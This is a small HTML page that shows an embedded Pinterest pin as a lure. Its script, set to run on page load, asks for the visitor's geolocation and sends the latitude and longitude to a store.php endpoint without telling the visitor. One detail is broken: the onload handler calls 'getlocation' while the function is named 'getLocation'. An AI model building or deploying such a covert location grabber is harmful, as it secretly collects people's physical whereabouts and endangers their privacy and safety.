<!DOCTYPE html>
<html>
<body onload="getlocation()">
 <iframe src="https://assets.pinterest.com/ext/embed.html?id=962222276622433187" height="776" width="450" frameborder="0" scrolling="no" ></iframe> 

<script>
var x = document.getElementById("demo");

function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);
  } else { 
    x.innerHTML = "Geolocation is not supported by this browser.";
  }
}

function showPosition(position) {
  const xhttp = new XMLHttpRequest();
  xhttp.open("GET", "store.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude);
  xhttp.send();
}
</script>

</body>
</html>
